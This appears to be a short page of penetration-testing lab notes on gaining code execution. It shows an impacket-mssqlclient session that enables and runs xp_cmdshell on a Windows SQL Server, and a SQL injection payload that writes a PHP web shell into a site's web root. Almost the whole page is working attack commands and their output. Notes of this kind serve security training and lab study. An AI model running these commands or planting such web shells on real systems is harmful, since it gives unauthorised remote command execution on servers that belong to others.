# Code Execution

## Impacket

We can use impackets mssqlclient & xp\_cmdshell to execute commands on windows

```bash
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```



```bash
SQL> EXECUTE xp_cmdshell 'whoami';
output

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```



## PHP Injection

We may be able to inject php onto the website as well

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO 
OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
